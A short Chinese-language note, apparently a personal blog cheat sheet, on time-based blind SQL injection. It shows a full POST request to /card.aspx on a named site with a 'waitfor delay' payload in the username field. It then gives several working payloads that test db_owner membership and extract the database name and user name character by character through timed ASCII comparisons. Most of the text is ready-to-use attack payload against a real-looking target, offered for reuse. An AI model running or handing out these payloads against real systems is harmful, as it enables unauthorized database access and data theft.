@@ -1,0 +1,57 @@
+注入的基础知识就不说的了，只是在这里做个简单的笔记，以便之后拿起了就用。
+
+预览源代码打印关于
+01 POST /card.aspx HTTP/1.1  
+
+02 Content-Length: 96  
+
+03 Content-Type: application/x-www-form-urlencoded  
+
+04 X-Requested-With: XMLHttpRequest  
+
+05 Cookie: ASP.NET_SessionId=2k32d0nwvrzpbg55qucudt3b  
+
+06 Host: [url]www.cunlide.com[/url]  
+
+07 Connection: Keep-alive  
+
+08 Accept-Encoding: gzip,deflate  
+
+09 User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)  
+
+10 Accept: */*  
+
+11    
+
+12 cardid=1&cardpwd=1&Submit2=1&username=pxnjodhe%27%3b%20waitfor%20delay%20%270%3a0%3a5%27%20--%20 
+
+
+看POST数据，注入是发生在username这里。把username的值URL解码下这样比较清楚点。
+
+预览源代码打印关于
+1 pxnjodhe%27%3b%20waitfor%20delay%20%270%3a0%3a5%27%20--%20  
+
+2    
+
+3 pxnjodhe'; waitfor delay '0:0:5' -- 
+因为延时注入是通过页面返回的时间来判断的，所以当我进行猜解的时候也就是用时间来进行猜解，比如我们可以取出db_name的第一个字符，先转换成ASCII（表：http://www.cunlide.com/?post=34 ）在和数字进行比较（推荐使用<、>），在比较时我们可以用折半法，比如我们先猜解第一个字符是大写字母还是小写字母，就可以用91来做个标准小于91的为大写字母（A-F，或许是_ 、-），大于则反。
+下面两个语句为例子：
+
+预览源代码打印关于
+1 cardid=1&cardpwd=1&Submit2=1&username=pxnjodhe%27;if%20(0%3D(SELECT%20IS_MEMBER ('db_owner')))%20waitfor%20delay%20%270:0:11%27%20--%20  
+
+2 //判断权限  
+
+3 cardid=1&cardpwd=1&Submit2=1&username=pxnjodhe%27;if(ascii(substring(db_name(),1,1)))>40%20waitfor%20delay%20%270:0:2%27%20--%20  
+
+4 //数据库名  
+
+5 cardid=1&cardpwd=1&Submit2=1&username=pxnjodhe%27;if(ascii(substring(user_name(),1,1)))>115%20waitfor%20delay%20%270:0:1%27%20--%20  
+
+6 //用户名 
+
+
+建议用时但编码状态出问题时，可以试试未编码状态。
+
+如有错误指正下。
+ 
